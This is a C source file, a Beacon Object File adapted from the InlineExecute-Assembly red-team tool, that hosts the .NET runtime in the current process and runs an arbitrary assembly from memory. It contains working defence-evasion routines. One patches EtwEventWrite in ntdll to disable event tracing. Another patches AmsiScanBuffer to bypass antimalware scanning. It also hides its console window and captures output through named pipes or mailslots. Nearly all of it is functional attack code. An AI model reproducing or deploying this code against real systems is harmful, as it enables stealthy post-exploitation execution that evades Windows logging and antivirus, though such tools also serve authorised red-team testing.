/*
 * execute_assembly.c - InlineExecute-Assembly adapted for BOF-C-wrapper SDK
 *
 * Original: https://github.com/anthemtotheego/InlineExecute-Assembly
 * Author: anthemtotheego
 *
 * Adapted to use bof.h + bof_clr.h instead of custom headers.
 */

#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>

#include "bof.h"
#include "bof_clr.h"

/* ===========================================================================
 * ADDITIONAL FUNCTION POINTER TYPEDEFS
 * ===========================================================================*/

typedef DWORD (WINAPI* _GetCurrentProcessId)(void);
typedef BOOL (WINAPI* _AttachConsole)(DWORD dwProcessId);
typedef BOOL (WINAPI* _AllocConsole)(void);
typedef HWND (WINAPI* _GetConsoleWindow)(void);
typedef BOOL (WINAPI* _ShowWindow)(HWND hWnd, int nCmdShow);
typedef BOOL (WINAPI* _FreeConsole)(void);
typedef BOOL (WINAPI* _SetStdHandle)(DWORD nStdHandle, HANDLE hHandle);
typedef HANDLE (WINAPI* _GetStdHandle)(DWORD nStdHandle);
typedef BOOL (WINAPI* _CloseHandle)(HANDLE hObject);
typedef HANDLE (WINAPI* _CreateNamedPipeA)(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);

/* ===========================================================================
 * HELPER MACROS
 * ===========================================================================*/

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(ptr) HeapFree(GetProcessHeap(), 0, ptr)
#define STATUS_SUCCESS 0
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

/* ===========================================================================
 * MAILSLOT FUNCTIONS
 * ===========================================================================*/

BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
    *mailHandle = CreateMailslotA(lpszSlotName,
        0,
        MAILSLOT_WAIT_FOREVER,
        (LPSECURITY_ATTRIBUTES)NULL);

    if (*mailHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    return TRUE;
}

BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
    DWORD cbMessage = 0;
    DWORD cMessage = 0;
    DWORD cbRead = 0;
    BOOL fResult;
    LPSTR lpszBuffer = NULL;
    size_t size = 65535;
    char* achID = (char*)intAlloc(size);
    _memset(achID, 0, size);
    HANDLE hEvent;
    OVERLAPPED ov;

    hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (NULL == hEvent)
        return FALSE;
    ov.Offset = 0;
    ov.OffsetHigh = 0;
    ov.hEvent = hEvent;

    fResult = GetMailslotInfo(*mailHandle,
        (LPDWORD)NULL,
        &cbMessage,
        &cMessage,
        (LPDWORD)NULL);

    if (!fResult)
    {
        return FALSE;
    }

    if (cbMessage == MAILSLOT_NO_MESSAGE)
    {
        return TRUE;
    }

    while (cMessage != 0)
    {
        lpszBuffer = (LPSTR)GlobalAlloc(GPTR, _strlen((LPSTR)achID) * sizeof(CHAR) + cbMessage);
        if (NULL == lpszBuffer)
            return FALSE;
        lpszBuffer[0] = '\0';

        fResult = ReadFile(*mailHandle,
            lpszBuffer,
            cbMessage,
            &cbRead,
            &ov);

        if (!fResult)
        {
            GlobalFree((HGLOBAL)lpszBuffer);
            return FALSE;
        }

        _snprintf(output + _strlen(output), _strlen(lpszBuffer) + 1, "%s", lpszBuffer);

        fResult = GetMailslotInfo(*mailHandle,
            (LPDWORD)NULL,
            &cbMessage,
            &cMessage,
            (LPDWORD)NULL);

        if (!fResult)
        {
            return FALSE;
        }
    }

    GlobalFree((HGLOBAL)lpszBuffer);
    _CloseHandle pCloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
    pCloseHandle(hEvent);
    return TRUE;
}

/* ===========================================================================
 * VERSION DETECTION
 * ===========================================================================*/

BOOL FindVersion(void* assembly, int length) {
    char* assembly_c;
    assembly_c = (char*)assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for (int i = 0; i < length; i++)
    {
        for (int j = 0; j < 10; j++)
        {
            if (v4[j] != assembly_c[i + j])
            {
                break;
            }
            else
            {
                if (j == 9)
                {
                    return 1;
                }
            }
        }
    }
    return 0;
}

/* ===========================================================================
 * ETW PATCHING
 * ===========================================================================*/

BOOL patchETW(BOOL revertETW)
{
#ifdef _M_AMD64
    unsigned char etwPatch[] = { 0 };
#elif defined(_M_IX86)
    unsigned char etwPatch[3] = { 0 };
#endif
    SIZE_T uSize = 8;
    ULONG patchSize = 0;

    if (revertETW != 0) {
#ifdef _M_AMD64
        patchSize = 1;
        _memcpy(etwPatch, (unsigned char[]){ 0x4c }, patchSize);
#elif defined(_M_IX86)
        patchSize = 3;
        _memcpy((char*)etwPatch, "\x8b\xff\x55", patchSize);
#endif
    }
    else {
#ifdef _M_AMD64
        patchSize = 1;
        _memcpy(etwPatch, (unsigned char[]){ 0xc3 }, patchSize);
#elif defined(_M_IX86)
        patchSize = 3;
        _memcpy((char*)etwPatch, "\xc2\x14\x00", patchSize);
#endif
    }

    void* pAddress = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (pAddress == NULL)
    {
        _perror("Getting pointer to EtwEventWrite failed\n");
        return 0;
    }

    void* lpBaseAddress = pAddress;
    ULONG OldProtection, NewProtection;

    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
    if (status != STATUS_SUCCESS) {
        _perror("[-] NtProtectVirtualMemory failed %d\n", status);
        return 0;
    }

    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)etwPatch, sizeof(etwPatch) / sizeof(etwPatch[0]), NULL);
    if (status != STATUS_SUCCESS) {
        _perror("[-] NtWriteVirtualMemory failed\n");
        return 0;
    }

    status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
    if (status != STATUS_SUCCESS) {
        _perror("[-] NtProtectVirtualMemory2 failed\n");
        return 0;
    }

    return 1;
}

/* ===========================================================================
 * AMSI PATCHING
 * ===========================================================================*/

BOOL patchAMSI()
{
#ifdef _M_AMD64
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#elif defined(_M_IX86)
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif

    HINSTANCE hinst = LoadLibraryA("amsi.dll");
    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer");
    if (pAddress == NULL)
    {
        _perror("AmsiScanBuffer failed\n");
        return 0;
    }

    void* lpBaseAddress = pAddress;
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(amsiPatch);

    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    NTSTATUS status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
    if (status != STATUS_SUCCESS) {
        _perror("[-] NtProtectVirtualMemory failed %d\n", status);
        return 0;
    }

    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
    if (status != STATUS_SUCCESS) {
        _perror("[-] NtWriteVirtualMemory failed\n");
        return 0;
    }

    status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
    if (status != STATUS_SUCCESS) {
        _perror("[-] NtProtectVirtualMemory2 failed\n");
        return 0;
    }

    return 1;
}

/* ===========================================================================
 * CLR INITIALIZATION
 * ===========================================================================*/

static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost** ppClrMetaHost, ICLRRuntimeInfo** ppClrRuntimeInfo, ICorRuntimeHost** ppICorRuntimeHost) {
    HRESULT hr = S_OK;

    hr = CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

    if (hr == S_OK)
    {
        hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
        if (hr == S_OK)
        {
            BOOL fLoadable;
            hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
            if ((hr == S_OK) && fLoadable)
            {
                hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
                if (hr == S_OK)
                {
                    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
                }
                else
                {
                    _perror("[-] Process refusing to get interface of %ls CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                _perror("[-] Process refusing to load %ls CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            _perror("[-] Process refusing to get runtime of %ls CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        _perror("[-] Process refusing to create %ls CLR version.\n", dotNetVersion);
        return 0;
    }

    return 1;
}

/* ===========================================================================
 * CONSOLE CHECK
 * ===========================================================================*/

static BOOL consoleExists(void) {
    _GetConsoleWindow pGetConsoleWindow = (_GetConsoleWindow)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
    return !!pGetConsoleWindow();
}

/* ===========================================================================
 * BOF ENTRY POINT
 * ===========================================================================*/

void go(char* args, int length) {
    _args parser;
    _args_parse(&parser, args, length);

    char* appDomain = NULL;
    char* assemblyArguments = NULL;
    char* pipeName = NULL;
    char* slotName = NULL;
    BOOL amsi = 0;
    BOOL etw = 0;
    BOOL revertETW = 0;
    BOOL mailSlot = 0;
    ULONG entryPoint = 1;
    size_t assemblyByteLen = 0;

    appDomain = _args_str(&parser, NULL);
    amsi = _args_int(&parser);
    etw = _args_int(&parser);
    revertETW = _args_int(&parser);
    mailSlot = _args_int(&parser);
    entryPoint = _args_int(&parser);
    slotName = _args_str(&parser, NULL);
    pipeName = _args_str(&parser, NULL);
    assemblyArguments = _args_str(&parser, NULL);
    assemblyByteLen = _args_int(&parser);
    char* assemblyBytes = _args_str(&parser, NULL);

    SIZE_T pipeNameLen = _strlen(pipeName);
    char* pipePath = _malloc(pipeNameLen + 10);
    _memset(pipePath, 0, pipeNameLen + 10);
    _memcpy(pipePath, "\\\\.\\pipe\\", 9);
    _memcpy(pipePath + 9, pipeName, pipeNameLen + 1);

    SIZE_T slotNameLen = _strlen(slotName);
    char* slotPath = _malloc(slotNameLen + 14);
    _memset(slotPath, 0, slotNameLen + 14);
    _memcpy(slotPath, "\\\\.\\mailslot\\", 13);
    _memcpy(slotPath + 13, slotName, slotNameLen + 1);

    HRESULT hr = S_OK;
    ICLRMetaHost* pClrMetaHost = NULL;
    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;
    ICorRuntimeHost* pICorRuntimeHost = NULL;
    IUnknown* pAppDomainThunk = NULL;
    AppDomain* pAppDomain = NULL;
    Assembly* pAssembly = NULL;
    MethodInfo* pMethodInfo = NULL;
    VARIANT vtPsa = { 0 };
    SAFEARRAYBOUND rgsabound[1] = { 0 };
    wchar_t* wAssemblyArguments = NULL;
    wchar_t* wAppDomain = NULL;
    wchar_t* wNetVersion = NULL;
    LPWSTR* argumentsArray = NULL;
    int argumentCount = 0;
    HANDLE stdOutput;
    HANDLE mainHandle;
    HANDLE hFile;
    size_t wideSize = 0;
    size_t wideSize2 = 0;
    BOOL success = 1;
    size_t size = 65535;
    char* returnData = (char*)intAlloc(size);
    _memset(returnData, 0, size);

    if (FindVersion((void*)assemblyBytes, assemblyByteLen))
    {
        wNetVersion = L"v4.0.30319";
    }
    else
    {
        wNetVersion = L"v2.0.50727";
    }

    size_t convertedChars = 0;
    wideSize = _strlen(assemblyArguments) + 1;
    wAssemblyArguments = (wchar_t*)_malloc(wideSize * sizeof(wchar_t));
    _mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, wideSize - 1);

    size_t convertedChars2 = 0;
    wideSize2 = _strlen(appDomain) + 1;
    wAppDomain = (wchar_t*)_malloc(wideSize2 * sizeof(wchar_t));
    _mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, wideSize2 - 1);

    argumentsArray = CommandLineToArgvW(wAssemblyArguments, &argumentCount);

    vtPsa.vt = (VT_ARRAY | VT_BSTR);
    vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

    for (long i = 0; i < argumentCount; i++)
    {
        SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argumentsArray[i]));
    }

    if (etw != 0 || revertETW != 0) {
        success = patchETW(0);
        if (success != 1) {
            _perror("Patching ETW failed. Try running without patching ETW");
            return;
        }
    }

    success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);
    if (success != 1) {
        return;
    }

    if (mailSlot != 0) {
        success = MakeSlot(slotPath, &mainHandle);
        hFile = CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
    }
    else {
        _CreateNamedPipeA pCreateNamedPipeA = (_CreateNamedPipeA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateNamedPipeA");
        mainHandle = pCreateNamedPipeA(pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL);
        hFile = CreateFileA(pipePath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
    }

    BOOL frConsole = 0;
    BOOL attConsole = 0;
    attConsole = consoleExists();

    if (attConsole != 1)
    {
        frConsole = 1;
        _AllocConsole pAllocConsole = (_AllocConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "AllocConsole");
        _GetConsoleWindow pGetConsoleWindow = (_GetConsoleWindow)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
        pAllocConsole();

        HINSTANCE hinst = LoadLibraryA("user32.dll");
        _ShowWindow pShowWindow = (_ShowWindow)GetProcAddress(hinst, "ShowWindow");
        HWND wnd = pGetConsoleWindow();
        if (wnd)
            pShowWindow(wnd, SW_HIDE);
    }

    _GetStdHandle pGetStdHandle = (_GetStdHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetStdHandle");
    stdOutput = pGetStdHandle(((DWORD)-11));

    _SetStdHandle pSetStdHandle = (_SetStdHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");
    success = pSetStdHandle(((DWORD)-11), hFile);

    hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
    hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);

    if (amsi != 0) {
        success = patchAMSI();
        if (success != 1) {
            _perror("Patching AMSI failed. Try running without patching AMSI and using obfuscation");
            return;
        }
    }

    rgsabound[0].cElements = assemblyByteLen;
    rgsabound[0].lLbound = 0;
    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
    void* pvData = NULL;
    hr = SafeArrayAccessData(pSafeArray, &pvData);

    _memcpy(pvData, assemblyBytes, assemblyByteLen);

    hr = SafeArrayUnaccessData(pSafeArray);

    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
    if (hr != S_OK) {
        _perror("[-] Process refusing to load AppDomain of %ls CLR version.\n", wNetVersion);
        return;
    }
    hr = pAssembly->lpVtbl->get_EntryPoint(pAssembly, &pMethodInfo);
    if (hr != S_OK) {
        _perror("[-] Process refusing to find entry point of assembly.\n");
        return;
    }

    VARIANT retVal;
    _memset(&retVal, 0, sizeof(VARIANT));
    VARIANT obj;
    _memset(&obj, 0, sizeof(VARIANT));
    obj.vt = VT_NULL;

    SAFEARRAY* psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);

    long idx[1] = { 0 };
    SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

    hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);

    if (mailSlot != 0) {
        success = ReadSlot(returnData, &mainHandle);
    }
    else {
        DWORD bytesToRead = 65535;
        DWORD bytesRead = 0;
        success = ReadFile(mainHandle, (LPVOID)returnData, bytesToRead, &bytesRead, NULL);
    }

    _printf("\n\n%s\n", returnData);

    _CloseHandle pCloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
    pCloseHandle(mainHandle);
    pCloseHandle(hFile);

    success = pSetStdHandle(((DWORD)-11), stdOutput);

    SafeArrayDestroy(pSafeArray);
    VariantClear(&retVal);
    VariantClear(&obj);
    VariantClear(&vtPsa);

    if (NULL != psaStaticMethodArgs) {
        SafeArrayDestroy(psaStaticMethodArgs);
        psaStaticMethodArgs = NULL;
    }
    if (pMethodInfo != NULL) {
        pMethodInfo->lpVtbl->Release(pMethodInfo);
        pMethodInfo = NULL;
    }
    if (pAssembly != NULL) {
        pAssembly->lpVtbl->Release(pAssembly);
        pAssembly = NULL;
    }
    if (pAppDomain != NULL) {
        pAppDomain->lpVtbl->Release(pAppDomain);
        pAppDomain = NULL;
    }
    if (pAppDomainThunk != NULL) {
        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    }
    if (pICorRuntimeHost != NULL)
    {
        pICorRuntimeHost->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
        pICorRuntimeHost = NULL;
    }
    if (pClrRuntimeInfo != NULL)
    {
        pClrRuntimeInfo->lpVtbl->Release(pClrRuntimeInfo);
        pClrRuntimeInfo = NULL;
    }
    if (pClrMetaHost != NULL)
    {
        pClrMetaHost->lpVtbl->Release(pClrMetaHost);
        pClrMetaHost = NULL;
    }

    if (frConsole != 0) {
        _FreeConsole pFreeConsole = (_FreeConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
        success = pFreeConsole();
    }

    if (revertETW != 0) {
        success = patchETW(revertETW);
        if (success != 1) {
            _perror("Reverting ETW back failed");
        }
    }

    _printf("[+] execute-assembly finished\n");
}
